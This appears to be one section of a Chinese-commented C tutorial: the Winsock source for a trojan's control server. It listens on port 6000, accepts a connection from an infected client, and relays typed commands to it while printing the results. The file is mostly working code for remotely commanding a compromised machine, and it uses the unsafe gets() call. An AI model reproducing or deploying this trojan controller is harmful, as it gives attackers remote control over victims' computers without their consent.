//（3）木马服务器程序：
#include <stdio.h>
#include <string.h>
#include <Winsock2.h>
#pragma comment(lib, "ws2_32.lib")
 
SOCKET sockClient;     // 客户端 Scoket
 
DWORD WINAPI ThreadProc (LPVOID lpThreadParameter)//为一个线程的起始地址,在调用CreateThread函数时，指定该地址
	                                              //接收线程传递给函数使用的CreateThread函数lpParameter参数数据
{
    char recvBuf[1024] = {0};    //缓冲区
    int num = 0;
    while (1)
    {
        num = recv(sockClient, recvBuf, 1024, 0);
        if (num > 0)
        {
            printf("Receive:\n%s\n>>", recvBuf);
            num = 0;
        }
        Sleep(50);
    }
    return 0;
}
 
void main()
{
    int err; // 错误信息
    int len = sizeof(SOCKADDR);
    DWORD Tid; // 线程 ID
 
    char  cmdStr[100] = {0};
    char sendBuf[100] = {0}; // 发送至客户端的字符串
    char recvBuf[1024] = {0}; // 接受客户端返回的字符串
    char * ip;
 
    SOCKET sockServer;     // 服务端 Socket
    SOCKADDR_IN addrServer;// 服务端地址    
    SOCKADDR_IN addrClient;// 客户端地址
 
    WSADATA wsaData;       // winsock 结构体
    WORD wVersionRequested;// winsock 的版本
 
    
    wVersionRequested = MAKEWORD( 2, 2 );	// 配置 Windows Socket版本
 
    
    err = WSAStartup( wVersionRequested, &wsaData );	// 初始化 Windows Socket
 
    if ( err != 0 )		// 启动错误，程序结束
    {
        
        return;
    }
 
    if ( LOBYTE( wsaData.wVersion ) != 2 || HIBYTE( wsaData.wVersion ) != 2 )		// 启动错误，程序结束
    {
        
        WSACleanup(); // 终止Winsock 2 DLL (Ws2_32.dll) 的使用
        return;
    }
 
    
    sockServer = socket(AF_INET, SOCK_STREAM, 0);		// 定义服务器端socket

    //--------------------设置服务端 socket--------------------
    addrServer.sin_addr.S_un.S_addr = inet_addr("192.168.28.128"); // 本机IP
    addrServer.sin_family = AF_INET;                   // 协议类型是INET
    addrServer.sin_port = htons(6000);                 // 绑定端口6000
	//--------------------设置服务端 socket end--------------------

	
    bind(sockServer, (SOCKADDR *)&addrServer, sizeof(SOCKADDR));// 将服务器端socket绑定在本地端口
    
    listen(sockServer, 5);		// Listen 监听端口,5 为等待连接数目
 
    printf("服务器已启动:\n监听中...\n");
 
    
    sockClient = accept(sockServer, (SOCKADDR *)&addrClient, &len);	// 等待客户端连接
    
    ip = inet_ntoa(addrClient.sin_addr);	// 获取ip地址
    
    printf("-- IP %s 连接到服务端\n", ip);	// 输出连接提示
 
    
    CreateThread(	// 开启接收消息
        NULL,       // 不能被子进程继承
        0,          // 默认堆栈大小
        ThreadProc, // 线程调用函数过程
        NULL,       // 传递参数
        0,          // 创建后立即执行
        &Tid        // 保存创建后的线程ID
    );
  
    while (1)
    {
        printf(">>");
        gets(cmdStr);
             
        
        if (strcmp(cmdStr, "exit") == 0)	// 根据输入的不同命令来执行不同的操作
        {
            send(sockClient, cmdStr, strlen(cmdStr) + 1, 0);	 // 如果用户输入 exit 则结束循环
            break;
        }
        
        send(sockClient, cmdStr, strlen(cmdStr) + 1, 0);	// 否则将命令发送到客户端
    }
    closesocket(sockClient);
    WSACleanup();
}

